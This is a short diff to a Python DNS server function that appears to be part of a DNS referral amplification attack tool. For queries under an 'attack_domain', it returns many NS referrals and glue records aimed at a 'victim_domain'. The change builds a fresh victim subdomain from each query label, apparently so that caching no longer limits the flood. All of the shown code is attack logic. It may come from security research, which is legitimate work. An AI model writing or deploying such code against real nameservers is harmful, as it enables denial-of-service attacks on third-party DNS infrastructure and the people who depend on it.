@@ -83,11 +83,12 @@ def dns_response(data, client_ip):
     #     reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
     #     # reply.header.rcode = 3
     elif qn.endswith('.' + attack_domain):  # NXDomain
-        val = 0  # random.choice([0, 1])
+        val = 0  # TODO: random.choice([0, 1])
         if val == 0:
             for ind, rdata in enumerate(referral_responses):
                 reply.add_auth(RR(rname=DomainName(qn), rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-                referral_domain = DomainName('fake-' + str(ind+1) + '.' + victim_domain)
+                mp = qn.split('.')[-3]
+                referral_domain = DomainName(mp + '-' + str(ind+1) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
         else:
             reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(local_ip)))
